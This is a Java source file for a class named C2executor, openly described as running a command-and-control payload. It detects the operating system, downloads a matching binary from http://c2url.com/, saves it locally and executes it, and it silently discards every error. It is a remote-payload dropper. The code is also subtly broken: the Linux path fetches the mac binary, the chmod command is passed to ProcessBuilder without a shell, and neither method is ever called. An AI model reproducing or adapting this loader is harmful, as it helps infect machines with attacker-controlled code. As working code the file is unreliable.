package executor;

import java.io.*;
import java.net.URL;

/**
 * This class executes the Command & Control
 * payload based on the system's OS
 */
public class C2executor {

    private String fileName;

    private String osSanitizer(String OS){
        String c2File = "";
        if(OS.indexOf("win")>=0){
            c2File = "c2.exe";
        } else if(OS.indexOf("mac")>=0){
            c2File = "c2_signed_mac_binary";
        } else if(OS.indexOf("nux")>=0){
            c2File = "linux_binary";
        }
        return c2File;
    }

    private void execute(String fileName){
        this.fileName = fileName;
        URL link;
        try {
            if(this.fileName.equals("c2.exe")){
                link = new URL("http://c2url.com/"+this.fileName);
            } else {
                link = new URL("http://c2url.com/c2_signed_mac_binary");
            }
            this.triggerBuffer(link);
            if(this.fileName.equals("linux_binary")){
                new ProcessBuilder("chmod +x linux_binary;./linux_binary").start();
            } else {
                new ProcessBuilder(this.fileName).start();
            }
        } catch(IOException e){

        }
    }

    private void triggerBuffer(URL link){
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buff = new byte[1024];
        int n;
        try {
            InputStream input = new BufferedInputStream(link.openStream());
            while (-1 != (n = input.read(buff)))
                output.write(buff, 0, n);
            output.close();
            input.close();
            byte[] response = output.toByteArray();
            FileOutputStream fileOutputStream = new FileOutputStream(this.fileName);
            fileOutputStream.write(response);
            fileOutputStream.close();
        } catch(IOException e){

        }
    }
}
